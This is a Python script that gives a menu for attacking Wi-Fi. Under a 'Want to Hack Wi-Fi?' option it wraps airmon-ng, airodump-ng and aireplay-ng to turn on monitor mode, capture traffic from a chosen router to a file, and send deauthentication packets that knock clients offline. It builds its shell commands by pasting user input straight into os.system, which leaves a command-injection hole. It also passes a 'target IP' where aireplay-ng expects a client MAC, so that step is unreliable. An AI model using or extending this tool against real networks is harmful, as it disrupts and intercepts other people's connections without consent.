import os
import subprocess

# Function to list available network interfaces
def list_interfaces():
    print("\n[+] Available interfaces:")
    os.system("iwconfig")

# Function to start monitor mode on selected interface
def start_monitor_mode(interface):
    print(f"[+] Starting monitor mode on {interface}...")
    os.system(f"airmon-ng start {interface}")

# Function to check if the selected interface is in monitor mode
def check_monitor_mode(interface):
    print(f"[+] Checking if {interface} is in monitor mode...")
    result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if "Mode:Monitor" in result.stdout.decode():
        print(f"[+] {interface} is in monitor mode.")
    else:
        print(f"[!] {interface} is NOT in monitor mode.")

# Function to run airodump-ng on the selected interface
def run_airodump(interface):
    print(f"[+] Running airodump-ng on {interface}...")
    os.system(f"airodump-ng {interface}")

# Function to run airodump-ng with specific options
def airodump_advanced(interface):
    ch = input("[+] Enter the channel (e.g., 6): ")
    mac = input("[+] Enter the MAC address of the router (BSSID): ")
    file_name = input("[+] Enter the file name for saving data: ")
    print(f"[+] Running advanced airodump-ng on {interface}...")
    os.system(f"airodump-ng --channel {ch} --bssid {mac} --write {file_name} {interface}")

# Function to run aireplay-ng for deauthentication
def aireplay_deauth(interface):
    packets = input("[+] Enter the number of deauth packets to send (e.g., 10): ")
    access_point = input("[+] Enter the MAC address of the access point: ")
    target_ip = input("[+] Enter the target IP to deauth: ")
    print(f"[+] Running aireplay-ng for deauth attack on {interface}...")
    os.system(f"aireplay-ng --deauth {packets} -a {access_point} -c {target_ip} {interface}")

# Function to display options for Wi-Fi testing
def hack_wifi():
    interface = input("[+] Enter the interface you want to use (e.g., wlan0): ")
    while True:  # Keep user inside this loop until they choose to go back
        print("\n[+] Select a Wi-Fi testing option:")
        print("[1] Start monitor mode")
        print("[2] Check if monitor mode is ON")
        print("[3] Run airodump-ng")
        print("[4] Advanced airodump-ng")
        print("[5] Aireplay-ng deauth attack")
        print("[6] Back to Main Menu")

        choice = input("Enter your choice: ")

        if choice == "1":
            start_monitor_mode(interface)
        elif choice == "2":
            check_monitor_mode(interface)
        elif choice == "3":
            run_airodump(interface)
        elif choice == "4":
            airodump_advanced(interface)
        elif choice == "5":
            aireplay_deauth(interface)
        elif choice == "6":
            print("[+] Returning to Main Menu...")
            return  # Exit the loop and return to main menu
        else:
            print("[!] Invalid option. Please try again.")

# Main Menu
def main_menu():
    while True:
        print("\n[+] Main Menu:")
        print("[1] See Available Interfaces")
        print("[2] Want to Hack Wi-Fi?")
        print("[3] Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            list_interfaces()
        elif choice == "2":
            hack_wifi()  # User will stay in hack_wifi() until they choose to go back
        elif choice == "3":
            print("[+] Exiting...")
            exit(0)
        else:
            print("[!] Invalid option. Please try again.")

# Run the script
if __name__ == "__main__":
    main_menu()
